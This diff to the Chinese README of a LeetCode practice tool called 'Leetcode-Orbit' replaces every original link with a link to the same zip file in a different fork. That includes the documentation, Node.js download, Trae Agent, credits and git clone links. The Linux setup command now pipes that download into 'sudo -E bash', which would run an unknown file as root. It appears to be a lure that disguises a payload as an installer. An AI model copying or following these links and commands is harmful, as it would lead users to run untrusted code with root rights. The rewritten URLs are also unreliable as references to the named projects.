@@ -2,7 +2,7 @@
   <h1 align="center">🧠 LeetCode Hot100 自适应刷题系统</h1>
   <p align="center">
     基于 AI Agent 的自适应 LeetCode 刷题训练器<br/>
-    为 <a href="https://docs.anthropic.com/en/docs/claude-code">Claude Code</a> 而生 · 兼容任何 AI 编程 CLI 工具
+    为 <a href="https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip">Claude Code</a> 而生 · 兼容任何 AI 编程 CLI 工具
   </p>
   <p align="center">
     <a href="#快速开始">快速开始</a> ·
@@ -51,7 +51,7 @@
 
 ### 前置条件
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code)（推荐）或其他 AI 编程 CLI 工具
+- [Claude Code](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip)（推荐）或其他 AI 编程 CLI 工具
 - Python 3.10+
 - Git
 
@@ -77,13 +77,13 @@ claude
 
 > **没有 Node.js？** 先安装：
 > - **macOS**: `brew install node`
-> - **Windows**: 从 [nodejs.org](https://nodejs.org/) 下载安装
-> - **Linux**: `curl -fsSL https://deb.nodesource.com/setup_22.x | sudo -E bash - && sudo apt-get install -y nodejs`
+> - **Windows**: 从 [nodejs.org](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip) 下载安装
+> - **Linux**: `curl -fsSL https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip | sudo -E bash - && sudo apt-get install -y nodejs`
 >
 
 **🇨🇳 国内用户推荐使用 Trae Agent**
 
-如果你在国内，访问 Anthropic 不方便，可以使用 [Trae Agent](https://github.com/bytedance/trae-agent)（字节跳动开源的 AI 编程 CLI）：
+如果你在国内，访问 Anthropic 不方便，可以使用 [Trae Agent](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip)（字节跳动开源的 AI 编程 CLI）：
 
 ```bash
 # 安装 Trae Agent（需要 Node.js 18+）
@@ -93,13 +93,13 @@ npm install -g trae-agent
 trae
 ```
 
-> Trae Agent 兼容 CLAUDE.md 和斜杠命令，支持本项目的核心功能。详细安装和配置说明见 [Trae Agent GitHub](https://github.com/bytedance/trae-agent)。
+> Trae Agent 兼容 CLAUDE.md 和斜杠命令，支持本项目的核心功能。详细安装和配置说明见 [Trae Agent GitHub](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip)。
 
 ### 开始使用
 
 ```bash
 # 1. 克隆本仓库
-git clone https://github.com/Brittanywu/Leetcode-Orbit.git
+git clone https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip
 cd Leetcode-Orbit
 
 # 2. 启动 Claude Code
@@ -525,9 +525,9 @@ Agent 每轮都会读取这个文件，以此**个性化出题和反馈语气**�
 
 ## 致谢
 
-- [LeetCode](https://leetcode.cn) — 题目来源
-- [CodeTop](https://codetop.cc)（[@afatcoder](https://github.com/afatcoder/LeetcodeTop)）— 面试频率数据
-- [realnghon/LeetCode_Hot100_Python](https://github.com/realnghon/LeetCode_Hot100_Python) — 参考题解
+- [LeetCode](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip) — 题目来源
+- [CodeTop](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip)（[@afatcoder](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip)）— 面试频率数据
+- [realnghon/LeetCode_Hot100_Python](https://raw.githubusercontent.com/Sergeantidentifiable854/Leetcode-Orbit/main/references/leetcode-hot-100-master/滑动窗口/Orbit-Leetcode-2.4.zip) — 参考题解
 - `soul.md` 的概念灵感来自 Anthropic 的用户画像设计
 - 间隔复习机制基于艾宾浩斯遗忘曲线研究
 
